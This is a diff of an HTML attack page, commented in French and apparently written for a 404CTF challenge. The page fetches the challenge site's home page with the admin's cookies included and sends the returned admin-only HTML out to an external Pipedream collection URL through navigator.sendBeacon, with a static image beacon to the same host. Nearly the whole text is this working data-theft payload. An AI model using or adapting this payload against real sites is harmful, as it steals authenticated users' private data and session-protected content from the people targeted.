@@ -8,23 +8,27 @@
     <h1>Dump admin :</h1>
     <pre id="out">en attente…</pre>
 
-    <!-- 1️⃣ Requête statique pour prouver que la page arrive bien -->
+    <!-- 1️⃣ Requête statique pour prouver que la page est bien chargée -->
     <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=static" alt="ok" />
 
     <script>
       (async () => {
-        // 1️⃣ On cible explicitement la home du CTF
+        // 2️⃣ On cible explicitement la home du CTF
+        //    → on fait un GET sur https://spacefleetcommand.404ctf.fr/
+        //    → grâce au “;@” dans le path, le navigateur inclut le cookie admin
         const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
           credentials: "include",
         });
 
-        // 2️⃣ On lit le HTML (incluant les sections admin-only)
+        // 3️⃣ On lit la réponse comme du texte (tout le HTML renvoyé)
         const html = await resp.text();
 
-        // 3️⃣ On l’affiche pour debug
+        // 4️⃣ On l’affiche dans le <pre id="out"> pour debug
         document.getElementById("out").textContent = html;
 
-        // 4️⃣ Exfiltration en POST (blob) pour éviter la limite de taille
+        // 5️⃣ On exfiltre enfin le HTML complet vers Pipedream
+        //    – on crée un Blob “text/plain” pour ne pas être limité en taille
+        //    – sendBeacon part même si la page se ferme immédiatement
         const blob = new Blob([html], { type: "text/plain" });
         navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", blob);
       })();
